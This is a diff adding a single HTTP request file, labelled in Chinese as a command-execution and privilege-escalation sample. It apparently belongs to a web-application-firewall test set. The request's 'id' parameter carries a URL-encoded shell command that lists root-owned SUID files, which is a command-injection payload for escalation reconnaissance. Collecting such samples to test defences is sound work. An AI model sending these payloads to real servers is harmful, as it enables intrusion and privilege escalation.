@@ -1,0 +1,9 @@
+# 命令执行_权限提升-06507049
+# 查看可提权的SUID或GUID
+GET /?id=find%20%2F%20-user%20root%20-perm%20-4000%20-exec%20ls%20-l%20%7B%7D%20%5C%3B&bid=hd_tag_m8mv260r HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260r
+RM-PRO-Token: 00a197fc0a3ee0b655633147b20d8a26
+RM-PRO-Time: 1742808520921
+User-Agent: curl/7.83.1
+
